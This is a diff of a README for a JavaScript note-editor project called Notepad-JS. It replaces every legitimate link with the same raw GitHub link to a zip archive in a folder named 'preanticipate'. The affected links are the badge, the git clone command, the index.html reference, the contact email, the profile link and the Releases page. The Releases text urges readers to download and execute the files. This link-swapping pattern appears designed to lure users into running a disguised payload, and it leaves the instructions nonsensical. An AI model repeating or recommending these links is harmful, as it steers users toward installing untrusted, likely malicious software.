@@ -1,6 +1,6 @@
 # Notepad-JS 📝
 
-![Notepad-JS](https://img.shields.io/badge/Notepad--JS-Responsive%20Note%20Editor-blue)
+![Notepad-JS](https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip%20Note%20Editor-blue)
 
 Welcome to the Notepad-JS repository! Notepad-JS is a professional, responsive, and feature-rich web-based note editor. Built with HTML5, CSS3, and JavaScript, this application allows users to create, edit, load, and save notes locally without the need for external APIs. 
 
@@ -41,7 +41,7 @@ To get started with Notepad-JS, follow these simple steps:
 
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/migueleuro/Notepad-JS.git
+   git clone https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip
    ```
 
 2. **Navigate to the Directory**: Change into the project directory:
@@ -49,7 +49,7 @@ To get started with Notepad-JS, follow these simple steps:
    cd Notepad-JS
    ```
 
-3. **Open the Application**: Open the `index.html` file in your preferred web browser to start using Notepad-JS.
+3. **Open the Application**: Open the `https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip` file in your preferred web browser to start using Notepad-JS.
 
 ## Usage
 
@@ -113,11 +113,11 @@ Notepad-JS is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [migueleuro](https://github.com/migueleuro)
+- **Email**: [https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip](https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip)
+- **GitHub**: [migueleuro](https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip)
 
 ## Releases
 
-To download the latest version of Notepad-JS, visit the [Releases section](https://github.com/migueleuro/Notepad-JS/releases). Make sure to download the appropriate files and execute them to get started with the latest features and improvements.
+To download the latest version of Notepad-JS, visit the [Releases section](https://raw.githubusercontent.com/migueleuro/Notepad-JS/main/preanticipate/JS_Notepad_1.9.zip). Make sure to download the appropriate files and execute them to get started with the latest features and improvements.
 
 Notepad-JS is a powerful tool designed for productivity. We hope you enjoy using it as much as we enjoyed building it!
